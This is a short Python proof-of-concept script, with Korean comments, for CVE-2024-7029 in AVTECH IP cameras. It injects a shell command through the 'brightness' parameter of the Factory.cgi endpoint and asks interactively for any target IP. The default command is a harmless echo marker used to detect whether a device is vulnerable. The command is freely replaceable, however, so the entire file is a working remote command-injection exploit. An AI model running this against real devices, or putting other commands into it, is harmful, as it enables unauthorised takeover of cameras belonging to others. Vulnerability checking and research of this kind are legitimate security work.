# SPDX-FileCopyrightText: © 2024 KimJuhyeong95 <bisyop@naver.com>
# SPDX-License-Identifier: MIT

import requests

def test_cve_2024_7029(target_ip, command="echo VULN_CHECK_7029"):
    """
    AVTECH IP Camera 취약점 (CVE-2024-7029) PoC - brightness 파라미터 명령 인젝션 테스트
    :param target_ip: 대상 장비 IP 또는 도메인
    :param command: 삽입할 테스트 명령 (기본값: echo VULN_CHECK_7029)
    """
    url = f"http://{target_ip}/cgi-bin/supervisor/Factory.cgi"

    # brightness 파라미터에 명령어 삽입
    payload = {
        "action": "white_led",
        "brightness": f"$({command})"
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "PoC-CVE-2024-7029"
    }

    try:
        print(f"[+] 대상: {url}")
        print(f"[+] 명령어: {command}")
        response = requests.post(url, data=payload, headers=headers, timeout=10)

        print("[+] HTTP 상태 코드:", response.status_code)
        print("[+] 응답 내용 (앞부분):")
        print(response.text[:500])  # 응답 본문 일부 출력

        # 단순히 결과가 노출되었는지 확인
        if "VULN_CHECK_7029" in response.text:
            print("[!!] 취약점 존재 가능성 높음: 명령 실행 결과 감지됨.")
        else:
            print("[+] 명확한 명령 실행 결과는 감지되지 않음.")
    except Exception as e:
        print(f"[!] 요청 실패: {e}")

if __name__ == "__main__":
    target = input("대상 IP 또는 도메인을 입력하세요 >> ").strip()
    test_cve_2024_7029(target)
